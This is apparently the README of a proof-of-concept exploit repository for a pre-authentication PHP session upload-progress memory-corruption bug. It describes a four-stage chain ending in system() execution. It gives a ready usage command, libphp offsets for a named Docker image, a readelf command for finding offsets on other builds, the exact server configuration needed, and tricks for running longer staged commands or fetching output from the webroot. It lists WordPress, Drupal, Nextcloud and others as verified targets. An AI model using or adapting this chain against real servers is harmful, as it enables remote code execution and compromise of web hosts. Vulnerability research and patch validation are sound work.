# php2shell-poc

Remote exploit for **CVE-2026-109618** (PHP `session.upload_progress` OOM corruption, CVSS 9.2). Pre-auth, application-independent: the entire chain runs inside PHP's request startup (rfc1867 multipart parsing + session upload-progress), before any application code executes.

## Chain

| Stage | Action |
|---|---|
| 0 | Abort prefork worker over HTTP → fresh heap state |
| 1 | OOM (`memory_limit` fatal) mid-multipart-parse leaves session globals dangling; next request URL-encodes reclaimed heap into `Set-Cookie: PHPSESSID` → **ZendMM chunk base** |
| 2 | HashTable-size grooming; cookie bytes 8–16 hold a `zval_ptr_dtor` pointer → **libphp base** |
| 3 | Forge a fake `HashTable` inside a 167-byte `zend_string` (`pDestructor = zif_system`, fake `execute_data` with `num_args=1`, `arg1` = command) over `PS(http_session_vars)`; session teardown invokes `system()` |

## Usage

```bash
python3 poc.py -u http://TARGET/index.php -c 'id>px.php' --fetch /px.php
```

Command is limited to 14 bytes (167-byte carrier minus header). For longer commands: `-c 'sh</tmp/c'` with the full script staged at `/tmp/c`, or write output to webroot and fetch it.

## Verified targets

Exploit executed `id` as `www-data`, first attempt per target, identical payload (php:8.4.26-apache, Apache 2.4.69 prefork):

| Target | Version |
|---|---|
| MediaWiki | 1.46.2 |
| WordPress | 6.x |
| Drupal | 11.4.3 |
| Joomla | 6.1.4 |
| phpMyAdmin | 5.2.3 |
| Roundcube | 1.7.4 |
| Nextcloud | 35.0.1 |

No application cooperation is used — apps were in unconfigured (setup-screen) state.

## Environment requirements

```ini
memory_limit = 8M              ; below --huge-mb (default 12)
post_max_size = 32M            ; above --huge-mb, or the OOM body is rejected
display_errors = On
max_input_vars = 1000          ; grooming depends on this exact value
session.upload_progress.enabled = On
session.use_strict_mode = Off
```

Apache mod_php with prefork, **single worker**:

```apache
<IfModule mpm_prefork_module>
  StartServers 1
  MinSpareServers 1
  MaxSpareServers 1
  MaxRequestWorkers 1
  MaxRequestsPerChild 0
</IfModule>
```

## Offsets

libphp-relative, measured on the official `php:8.4.26-apache` image (`/usr/lib/apache2/modules/libphp.so`):

```
zif_system    = 0x465370
zval_ptr_dtor = 0x65EB60
htdata        = 0x690D8   (chunk-relative, 167-byte live string)
```

Other builds: extract with `readelf -sW libphp.so | grep -wE 'zif_system|zval_ptr_dtor'` and pass `--zif-offset/--dtor-offset`. `--htdata-offset` is heap-grooming dependent; sweep if stage 3 fails.

## Limitations

- mod_php only. php-fpm exits on startup fatals, so no surviving worker state (the fpm variant requires a post-startup application-level decode sink).
- Single-worker prefork. With multiple workers the stage-1 leak is unreliable (leak and use may land on different children); Wiz's public testing measured 0/10 with 8 workers.
- `display_errors = On` required — stage 1/2 need the fatal/heap content in the response; with it off the leak fails.
- Offsets are build-specific. Any libphp rebuild (distro patches, different PHP build) shifts `zif_system`/`zval_ptr_dtor`; the `htdata` offset additionally depends on heap layout and may need sweeping.
- Command ≤ 14 bytes (carrier size). Chain via `sh</path/file` for longer payloads.
- Expected side effect: the exploited worker aborts after execution (visible as SIGABRT/SIGSEGV child exits in Apache logs). The command still runs.
- ASLR is bypassed via the two leaks; no crash-based guessing, but heap grooming constants (`STAGE1_N`, `STAGE2_T/V`, `STAGE3_PADS`) were calibrated on the above image and may need re-tuning elsewhere.

## References

- PHP advisory: GHSA-w8hw-w9fx-j79w (fixed 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12)
- Patched releases: https://www.php.net/archive/2026.php#2026-10-21-5

For authorized security testing only.
